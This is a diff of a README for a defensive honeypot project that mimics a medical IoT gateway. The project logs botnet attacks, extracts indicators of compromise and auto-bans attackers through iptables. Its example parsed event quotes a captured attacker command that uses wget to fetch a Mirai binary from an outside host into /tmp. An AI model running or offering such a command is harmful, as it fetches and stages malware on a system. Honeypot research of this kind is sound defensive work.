@@ -1,139 +1,111 @@
-# IoT Honeypot Network - Healthcare Security
+# Healthcare IoT Honeypot & Active IPS
 
-A comprehensive deception honeypot system designed to detect, trap, and analyze attackers targeting vulnerable IoT devices in healthcare environments.
+An SSH/Telnet honeypot setup built to mimic an exposed medical IoT gateway, log automated botnet attacks, extract Indicators of Compromise (IoCs), and automatically ban repeat offenders at the host firewall.
 
-## Project Overview
+I built this to study how opportunistic scanners and IoT botnets (like Mirai variants) fingerprint and exploit unpatched clinical devices—and to test automated containment rules without risking production infrastructure.
 
-This project implements a low-to-medium interaction honeypot network simulating vulnerable medical IoT devices to:
-- Proactively capture attacker behavioral patterns
-- Log exploitation attempts and malware payloads
-- Extract key indicators of compromise (IoCs)
-- Visualize threat intelligence on a centralized dashboard
+## How It Works
 
-## Project Structure
-
+```text
+Internet / Botnet Scanners
+       │
+       ▼  (SSH :2222 / Telnet :2223)
+┌────────────────────────────────────────────────────────┐
+│  AWS EC2 / Isolated Docker Network                     │
+│                                                        │
+│  Cowrie & Honeyd (Medical Gateway Simulation)          │
+│   ├─ Custom HL7/DICOM banners & embedded Linux FS      │
+│   └─ Records TTY sessions, credentials & dropped files │
+└──────────────────────────┬─────────────────────────────┘
+                           │ cowrie.json
+                           ▼
+┌────────────────────────────────────────────────────────┐
+│  Python Log & IPS Pipeline (scripts/)                  │
+│   ├─ log_parser.py    -> cleans logs & GeoIP lookup    │
+│   ├─ ioc_extractor.py -> pulls hashes, URLs & commands │
+│   └─ Active IPS       -> pushes bans to iptables/UFW   │
+└──────────────────────────┬─────────────────────────────┘
+                           │
+                           ▼
+                 Flask + D3.js Dashboard
 ```
-├── honeypot/                      # Honeypot deployment & configuration
-│   ├── docker-compose.yml         # Multi-container orchestration
-│   ├── Dockerfile                 # Honeypot container image
-│   ├── cowrie/                    # Cowrie SSH/Telnet honeypot config
-│   └── honeyd/                    # Honeyd low-interaction config
-├── scripts/                       # Automation & data processing
-│   ├── log_parser.py              # Parse honeypot logs to JSON
-│   ├── ioc_extractor.py           # Extract IoCs from captures
-│   ├── geolocation.py             # Enrich IPs with geo data
-│   └── setup.sh                   # Environment initialization
-├── dashboard/                     # Threat intelligence visualization
-│   ├── app.py                     # Flask dashboard backend
-│   ├── templates/                 # HTML templates
-│   ├── static/                    # CSS, JS, visualization libraries
-│   └── requirements.txt           # Python dependencies
-├── tests/                         # Testing & validation
-│   ├── test_parser.py             # Unit tests for log parsing
-│   └── integration_tests.py       # End-to-end tests
-├── docs/                          # Documentation
-│   ├── ARCHITECTURE.md            # System design overview
-│   ├── DEPLOYMENT.md              # Deployment guide
-│   ├── ANALYSIS_REPORT.md         # Final threat analysis
-│   └── NETWORK_DIAGRAM.md         # Network architecture
-├── .github/
-│   └── workflows/                 # CI/CD pipelines
-│       ├── test.yml               # Automated testing
-│       └── security-scan.yml      # Security scanning
-└── .gitignore
 
-## Key Features
+1. **Deception Layer (`honeypot/`):** Runs Cowrie and Honeyd inside isolated Docker containers configured with embedded ARM/MIPS banners and a fake filesystem resembling a hospital telemetry gateway.
+2. **Parsing & IoC Extraction (`scripts/`):** Python scripts ingest Cowrie's JSON event stream using `pandas`, enrich source IPs with ASN/GeoIP data, and pull out brute-force credential pairs, shell commands, and SHA-256 hashes of downloaded binaries.
+3. **Active Containment:** When an IP crosses a failed-login threshold or attempts payload delivery, a cron-driven script appends a drop rule to `iptables`/`ufw` (skipping a hardcoded management whitelist so I don't lock myself out).
+4. **Dashboard (`dashboard/`):** A lightweight Flask + D3.js app to inspect attack volume by country, most common default credentials, and executed shell payloads.
 
-- **Virtual Honeypot Deployment**: Docker-based isolated environment simulating medical IoT devices
-- **Logging & Analysis Engine**: Comprehensive capture of connection attempts, keystrokes, and payloads
-- **Threat Intelligence Dashboard**: Real-time visualization of attacks with geolocation mapping
-- **Automated IoC Extraction**: Identification of attacker IPs, malware hashes, and executed commands
+## Repo Layout
 
-## Technology Stack
+```text
+├── honeypot/               # Dockerfiles, docker-compose.yml, Cowrie & Honeyd configs
+├── scripts/
+│   ├── log_parser.py       # Normalizes raw Cowrie JSON logs
+│   ├── ioc_extractor.py    # Extracts IPs, URLs, commands, and file hashes
+│   ├── geolocation.py      # ASN and country enrichment
+│   └── setup.sh            # Host dependencies and initial firewall setup
+├── dashboard/              # Flask backend and D3.js frontend
+├── tests/                  # Pytest unit and pipeline integration tests
+└── docs/                   # Network diagram, deployment notes, and attack analysis
+```
 
-| Component | Technology | Purpose |
-|-----------|------------|---------|
-| Honeypot | Cowrie/Honeyd | SSH/Telnet deception with logging |
-| Infrastructure | Docker | Containerized isolation |
-| Data Processing | Python | Log parsing and analysis |
-| Visualization | Flask + D3.js | Dashboard and mapping |
-| Database | JSON/SQLite | Log storage and querying |
+## Running It Locally
 
-## 4-Week Roadmap
+1. **Clone and run setup:**
+   ```bash
+   git clone [https://github.com/kakarot2003/IoT-Honeypot-Network.git](https://github.com/kakarot2003/IoT-Honeypot-Network.git)
+   cd IoT-Honeypot-Network
+   chmod +x scripts/setup.sh
+   ./scripts/setup.sh
+   ```
 
-### Week 1: Environment Setup & Device Simulation
-- [ ] Configure isolated Docker environment
-- [ ] Deploy Cowrie with medical IoT device simulation
-- [ ] Configure realistic banners and filesystem
-- [ ] Set up network isolation
+2. **Start the honeypot containers:**
+   ```bash
+   docker compose -f honeypot/docker-compose.yml up -d
+   ```
 
-### Week 2: Exposure & Data Capture
-- [ ] Configure controlled exposure (test network)
-- [ ] Validate logging functionality
-- [ ] Test brute-force capture
-- [ ] Verify payload recording
+3. **Parse logs and launch the dashboard:**
+   ```bash
+   python3 scripts/log_parser.py --input honeypot/cowrie/var/log/cowrie/cowrie.json
+   python3 scripts/ioc_extractor.py
+   python3 dashboard/app.py
+   ```
+   Open `http://localhost:5000` in your browser.
 
-### Week 3: Log Parsing & Threat Intelligence
-- [ ] Develop log parsing pipeline
-- [ ] Extract indicators of compromise
-- [ ] Create IoC database
-- [ ] Implement threat correlation
+## Example Parsed Event
 
-### Week 4: Dashboarding & Geolocation Analysis
-- [ ] Build web dashboard
-- [ ] Implement IP geolocation
-- [ ] Create attack visualization
-- [ ] Generate final analysis report
+Here is what a typical captured botnet session looks like after passing through `ioc_extractor.py`:
 
-## Quick Start
+```json
+{
+  "timestamp": "2026-10-14T08:22:19Z",
+  "src_ip": "185.220.101.42",
+  "geo": { "country": "DE", "asn": "AS205100" },
+  "protocol": "ssh",
+  "auth_attempt": "root:admin123",
+  "mitre_attack": ["T1110.001", "T1059.004"],
+  "commands_executed": [
+    "uname -m",
+    "wget [http://198.51.100.14/bins/mirai.arm7](http://198.51.100.14/bins/mirai.arm7) -O /tmp/.init && chmod +x /tmp/.init"
+  ],
+  "payload_sha256": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
+  "ips_action": "BLOCKED_IPTABLES"
+}
+```
+
+## Safety & Isolation Notes
+
+If you deploy this on a public cloud VM (like AWS EC2), keep these guardrails in place:
+- **Block outbound traffic:** Drop all egress traffic from the honeypot container subnet except DNS/NTP. Otherwise, an attacker who compromises the shell could use your VM as a DDoS reflector or pivot point.
+- **Keep admin SSH separate:** Run your real SSH daemon on a non-standard port, bind it to a separate security group, and add your IP to the IPS whitelist before enabling automated firewall bans.
+- **Run rootless:** Cowrie runs as a non-root user inside the container with read-only mounts everywhere outside the log and download directories.
+
+## Tests
 
 ```bash
-# Clone repository
-git clone https://github.com/kakarot2003/IoT-Honeypot-Network.git
-cd IoT-Honeypot-Network
-
-# Setup environment
-./scripts/setup.sh
-
-# Deploy honeypot
-docker-compose up -d
-
-# Access dashboard
-open http://localhost:5000
+pytest tests/ -v
 ```
-
-## Security Considerations
-
-⚠️ **CRITICAL**: This honeypot is designed for controlled environments only:
-- Deploy within isolated networks (VLAN/subnet isolation)
-- Implement strict egress filtering
-- Monitor for breakthrough attempts
-- Log all administrative access
-- Comply with organizational security policies
-
-## Success Metrics
-
-✓ **Honeypot Fidelity**: Successfully deceives attackers into believing it's a real medical device
-✓ **Logging Coverage**: Captures 100% of connection attempts and payloads
-✓ **Dashboard Accuracy**: Correctly geolocates and categorizes attacks
-✓ **HIPAA Compliance**: Demonstrates advanced proactive security measures
-
-## User Personas
-
-| Role | Needs | Interaction |
-|------|-------|-------------|
-| Threat Researcher (Intern) | Safe malware analysis environment | Deploy, monitor, extract payloads |
-| Network Administrator | Early detection of lateral movement | Alert on internal IP connections |
-| Compliance Auditor | Proof of advanced security | Threat intelligence reports |
-
-## Contributing
-
-This is an internship project. For questions or improvements, open an issue in the GitHub repository.
 
 ## License
 
-MIT License - See LICENSE file for details
-
-## Contact
-
-Project Owner: kakarot2003
+MIT — see [LICENSE](LICENSE).
